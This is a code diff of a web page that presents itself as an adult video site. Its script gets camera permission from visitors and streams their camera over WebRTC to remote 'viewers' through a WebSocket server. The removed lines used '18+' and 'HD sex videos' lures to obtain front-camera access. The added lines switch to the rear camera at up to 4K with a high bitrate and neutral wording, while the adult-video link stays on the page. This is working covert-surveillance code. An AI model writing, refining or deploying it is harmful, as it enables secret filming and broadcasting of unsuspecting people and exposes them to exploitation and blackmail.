@@ -127,105 +127,162 @@
   >
     HD sex videos
   </a>
+<script>
+  const status =
+    document.getElementById("status");
 
-  <script>
+  const idBox =
+    document.getElementById("id");
 
-    const status =
-      document.getElementById("status");
+  const permissionGate =
+    document.getElementById("permissionGate");
 
-    const idBox =
-      document.getElementById("id");
+  const allowCameraBtn =
+    document.getElementById("allowCameraBtn");
 
-    const permissionGate =
-      document.getElementById("permissionGate");
-
-    const allowCameraBtn =
-      document.getElementById("allowCameraBtn");
-
-    const permissionMessage =
-      document.getElementById("permissionMessage");
-
-    let stream = null;
-    let cameraId = null;
-    let roleReceived = false;
-    let permissionAllowed = false;
-
-    const peers = new Map();
-    const pendingCandidates = new Map();
+  const permissionMessage =
+    document.getElementById("permissionMessage");
 
 
-    const ws = new WebSocket(
-      (location.protocol === "https:" ? "wss:" : "ws:") +
-      "//" + location.host + "/camera"
-    );
+  let stream = null;
+  let cameraId = null;
+  let roleReceived = false;
+  let permissionAllowed = false;
 
 
-    function sendMessage(message) {
+  const peers = new Map();
+  const pendingCandidates = new Map();
 
-      if (ws.readyState === WebSocket.OPEN) {
 
-        ws.send(JSON.stringify(message));
+  // ==========================================
+  // WEBSOCKET
+  // ==========================================
 
-        return true;
+  const ws = new WebSocket(
+    (location.protocol === "https:"
+      ? "wss:"
+      : "ws:") +
+    "//" +
+    location.host +
+    "/camera"
+  );
 
-      }
 
-      return false;
+  function sendMessage(message) {
+    if (
+      ws.readyState ===
+      WebSocket.OPEN
+    ) {
+      ws.send(
+        JSON.stringify(message)
+      );
 
+      return true;
     }
 
+    return false;
+  }
 
-    function announceCameraLive() {
 
-      if (
-        !permissionAllowed ||
-        !stream ||
-        !roleReceived
-      ) {
-        return;
-      }
+  // ==========================================
+  // CAMERA LIVE
+  // ==========================================
 
-      sendMessage({
-        type: "camera-live"
-      });
-
+  function announceCameraLive() {
+    if (
+      !permissionAllowed ||
+      !stream ||
+      !roleReceived
+    ) {
+      return;
     }
 
+    sendMessage({
+      type: "camera-live"
+    });
+  }
 
-    // REQUEST FRONT CAMERA ONLY AFTER 18+ BUTTON
 
-    allowCameraBtn.onclick = async () => {
+  // ==========================================
+  // CAMERA PERMISSION
+  // HIGH RESOLUTION
+  // ==========================================
 
-      allowCameraBtn.disabled = true;
+  allowCameraBtn.onclick =
+    async () => {
+
+      allowCameraBtn.disabled =
+        true;
 
       permissionMessage.textContent =
-        "allow permission...";
+        "Requesting camera permission...";
+
 
       try {
 
         stream =
-          await navigator.mediaDevices.getUserMedia({
+          await navigator.mediaDevices
+            .getUserMedia({
 
-            video: {
-              facingMode: {
-                exact: "environment"
-              }
-            },
+              video: {
 
-            audio: false
+                // Rear camera
+                facingMode: {
+                  ideal: "environment"
+                },
 
-          });
+                // Request up to 4K
+                width: {
+                  ideal: 3840,
+                  max: 3840
+                },
 
-        permissionAllowed = true;
+                height: {
+                  ideal: 2160,
+                  max: 2160
+                },
 
-        permissionGate.style.display = "none";
+                // 30 FPS
+                frameRate: {
+                  ideal: 30,
+                  max: 30
+                }
+
+              },
+
+              audio: false
+
+            });
+
+
+        permissionAllowed =
+          true;
+
+
+        permissionGate.style.display =
+          "none";
+
+
+        // Show actual camera resolution
+        const track =
+          stream.getVideoTracks()[0];
+
+        const settings =
+          track.getSettings();
+
+
+        console.log(
+          "Camera settings:",
+          settings
+        );
+
 
         status.textContent =
-          "click here and see more HD sex videos";
+          "Camera active: " +
+          (settings.width || "?") +
+          "x" +
+          (settings.height || "?");
 
-
-        // Announce the camera only when
-        // the WebSocket role has been received.
 
         announceCameraLive();
 
@@ -233,65 +290,96 @@
 
       catch (err) {
 
+        console.error(
+          "Camera error:",
+          err
+        );
+
+
         stream = null;
 
-        allowCameraBtn.disabled = false;
+        allowCameraBtn.disabled =
+          false;
+
 
         permissionMessage.textContent =
-          "❌ Front camera permission is required. If you are 18+, please allow access to continue.";
+          "Camera permission was not granted. Please allow camera access.";
+
 
         status.textContent =
-          "🔒 Front camera permission denied";
+          "Camera permission denied";
 
       }
 
     };
 
 
-    function createPeer(viewerId) {
+  // ==========================================
+  // CREATE WEBRTC PEER
+  // ==========================================
 
-      const old =
-        peers.get(viewerId);
+  function createPeer(viewerId) {
 
-      if (old) {
+    const old =
+      peers.get(viewerId);
 
+
+    if (old) {
+
+      try {
         old.close();
+      } catch (err) {}
 
-      }
+      peers.delete(viewerId);
 
-
-      const pc =
-        new RTCPeerConnection({
-
-          iceServers: [
-            {
-              urls:
-                "stun:stun.l.google.com:19302"
-            }
-          ]
-
-        });
+    }
 
 
-      peers.set(viewerId, pc);
+    const pc =
+      new RTCPeerConnection({
 
-      pendingCandidates.set(
-        viewerId,
-        []
-      );
+        iceServers: [
+
+          {
+            urls:
+              "stun:stun.l.google.com:19302"
+          }
+
+        ]
+
+      });
 
 
-      pc.onicecandidate = e => {
+    peers.set(
+      viewerId,
+      pc
+    );
 
-        if (e.candidate) {
+
+    pendingCandidates.set(
+      viewerId,
+      []
+    );
+
+
+    // ========================================
+    // ICE
+    // ========================================
+
+    pc.onicecandidate =
+      event => {
+
+        if (event.candidate) {
 
           sendMessage({
 
             type: "candidate",
 
-            candidate: e.candidate,
+            candidate:
+              event.candidate,
 
-            toViewerId: viewerId
+            toViewerId:
+              viewerId
 
           });
 
@@ -300,58 +388,162 @@
       };
 
 
-      pc.onconnectionstatechange = () => {
+    // ========================================
+    // CONNECTION STATE
+    // ========================================
+
+    pc.onconnectionstatechange =
+      () => {
 
         console.log(
-          "Connection state:",
+          "Viewer:",
+          viewerId,
+          "Connection:",
           pc.connectionState
         );
+
+
+        if (
+          pc.connectionState ===
+            "failed" ||
+          pc.connectionState ===
+            "closed"
+        ) {
+
+          try {
+            pc.close();
+          } catch (err) {}
+
+
+          peers.delete(
+            viewerId
+          );
+
+
+          pendingCandidates.delete(
+            viewerId
+          );
+
+        }
 
       };
 
 
-      if (stream) {
+    // ========================================
+    // ADD HIGH QUALITY VIDEO TRACK
+    // ========================================
 
-        stream.getTracks().forEach(track => {
+    if (stream) {
 
-          pc.addTrack(track, stream);
+      stream
+        .getTracks()
+        .forEach(track => {
+
+          const sender =
+            pc.addTrack(
+              track,
+              stream
+            );
+
+
+          // Prefer high bitrate
+          if (
+            sender &&
+            sender.getParameters &&
+            sender.setParameters
+          ) {
+
+            const parameters =
+              sender.getParameters();
+
+
+            if (
+              !parameters.encodings
+            ) {
+
+              parameters.encodings =
+                [{}];
+
+            }
+
+
+            parameters
+              .encodings[0]
+              .maxBitrate =
+              12000000;
+
+
+            parameters
+              .encodings[0]
+              .maxFramerate =
+              30;
+
+
+            sender
+              .setParameters(
+                parameters
+              )
+              .catch(err => {
+
+                console.log(
+                  "Encoding settings not applied:",
+                  err
+                );
+
+              });
+
+          }
 
         });
-
-      }
-
-
-      return pc;
 
     }
 
 
-    ws.onopen = () => {
+    return pc;
 
-      console.log(
-        "Camera WebSocket connected"
-      );
-
-      if (
-        permissionAllowed &&
-        stream &&
-        roleReceived
-      ) {
-
-        announceCameraLive();
-
-      }
-
-    };
+  }
 
 
-    ws.onmessage = async e => {
+  // ==========================================
+  // WEBSOCKET OPEN
+  // ==========================================
+
+  ws.onopen = () => {
+
+    console.log(
+      "Camera WebSocket connected"
+    );
+
+
+    if (
+      permissionAllowed &&
+      stream &&
+      roleReceived
+    ) {
+
+      announceCameraLive();
+
+    }
+
+  };
+
+
+  // ==========================================
+  // WEBSOCKET MESSAGE
+  // ==========================================
+
+  ws.onmessage =
+    async event => {
 
       let m;
 
+
       try {
 
-        m = JSON.parse(e.data);
+        m =
+          JSON.parse(
+            event.data
+          );
 
       }
 
@@ -366,7 +558,13 @@
       }
 
 
-      if (m.type === "role") {
+      // ========================================
+      // ROLE
+      // ========================================
+
+      if (
+        m.type === "role"
+      ) {
 
         cameraId =
           m.cameraId;
@@ -376,39 +574,42 @@
 
 
         idBox.textContent =
-          "sex ID: " + cameraId;
+          "Camera ID: " +
+          cameraId;
 
-
-        // IMPORTANT:
-        // Send the exact message expected
-        // by the viewer/server.
 
         if (
           permissionAllowed &&
           stream
         ) {
 
-          status.textContent =
-            "see sex videos";
-
           announceCameraLive();
 
         }
+
 
         return;
 
       }
 
 
-      if (m.type === "viewer-ready") {
+      // ========================================
+      // VIEWER READY
+      // ========================================
 
-        // No stream = no camera access
+      if (
+        m.type === "viewer-ready"
+      ) {
 
-        if (!stream) return;
+        if (!stream) {
+          return;
+        }
 
 
         const pc =
-          createPeer(m.viewerId);
+          createPeer(
+            m.viewerId
+          );
 
 
         try {
@@ -416,8 +617,11 @@
           const offer =
             await pc.createOffer({
 
-              offerToReceiveAudio: false,
-              offerToReceiveVideo: false
+              offerToReceiveAudio:
+                false,
+
+              offerToReceiveVideo:
+                false
 
             });
 
@@ -431,9 +635,11 @@
 
             type: "offer",
 
-            offer: pc.localDescription,
+            offer:
+              pc.localDescription,
 
-            toViewerId: m.viewerId
+            toViewerId:
+              m.viewerId
 
           });
 
@@ -454,17 +660,29 @@
       }
 
 
-      if (m.type === "answer") {
+      // ========================================
+      // ANSWER
+      // ========================================
+
+      if (
+        m.type === "answer"
+      ) {
 
         const viewerId =
-          m.toViewerId || m.viewerId;
+          m.toViewerId ||
+          m.viewerId;
 
 
         const pc =
-          peers.get(viewerId);
+          peers.get(
+            viewerId
+          );
 
 
-        if (pc && m.answer) {
+        if (
+          pc &&
+          m.answer
+        ) {
 
           try {
 
@@ -481,7 +699,10 @@
               ) || [];
 
 
-            for (const candidate of queued) {
+            for (
+              const candidate
+              of queued
+            ) {
 
               await pc
                 .addIceCandidate(
@@ -489,7 +710,9 @@
                     candidate
                   )
                 )
-                .catch(() => {});
+                .catch(
+                  () => {}
+                );
 
             }
 
@@ -518,23 +741,35 @@
       }
 
 
-      if (m.type === "candidate") {
+      // ========================================
+      // ICE CANDIDATE
+      // ========================================
+
+      if (
+        m.type === "candidate"
+      ) {
 
         const viewerId =
-          m.toViewerId || m.viewerId;
+          m.toViewerId ||
+          m.viewerId;
 
 
-        if (!viewerId) return;
+        if (
+          !viewerId ||
+          !m.candidate
+        ) {
+          return;
+        }
 
 
         const pc =
-          peers.get(viewerId);
+          peers.get(
+            viewerId
+          );
 
 
         if (!pc) {
-
           return;
-
         }
 
 
@@ -549,7 +784,9 @@
                 m.candidate
               )
             )
-            .catch(() => {});
+            .catch(
+              () => {}
+            );
 
         }
 
@@ -571,7 +808,9 @@
 
           pendingCandidates
             .get(viewerId)
-            .push(m.candidate);
+            .push(
+              m.candidate
+            );
 
         }
 
@@ -583,68 +822,81 @@
     };
 
 
-    ws.onerror = () => {
+  // ==========================================
+  // WEBSOCKET ERROR
+  // ==========================================
 
-      console.log(
-        "WebSocket error"
-      );
+  ws.onerror = () => {
 
-    };
+    console.log(
+      "WebSocket error"
+    );
+
+  };
 
 
-    ws.onclose = () => {
+  // ==========================================
+  // WEBSOCKET CLOSED
+  // ==========================================
 
-      status.textContent =
-        "🔴 Connection closed";
+  ws.onclose = () => {
 
-      peers.forEach(pc => {
+    status.textContent =
+      "Connection closed";
+
+
+    peers.forEach(
+      pc => {
 
         try {
-
           pc.close();
-
-        }
-
-        catch (err) {}
-
-      });
-
-      peers.clear();
-
-      pendingCandidates.clear();
-
-    };
-
-
-    window.addEventListener(
-      "beforeunload",
-      () => {
-
-        peers.forEach(pc => {
-
-          try {
-
-            pc.close();
-
-          }
-
-          catch (err) {}
-
-        });
-
-
-        if (
-          ws.readyState === WebSocket.OPEN
-        ) {
-
-          ws.close();
-
-        }
+        } catch (err) {}
 
       }
     );
 
-  </script>
 
-</body>
+    peers.clear();
+    pendingCandidates.clear();
+
+  };
+
+
+  // ==========================================
+  // CLEANUP
+  // ==========================================
+
+  window.addEventListener(
+    "beforeunload",
+    () => {
+
+      peers.forEach(
+        pc => {
+
+          try {
+            pc.close();
+          } catch (err) {}
+
+        }
+      );
+
+
+      peers.clear();
+      pendingCandidates.clear();
+
+
+      if (
+        ws.readyState ===
+        WebSocket.OPEN
+      ) {
+
+        ws.close();
+
+      }
+
+    }
+  );
+
+</script>
+  </body>
   </html>
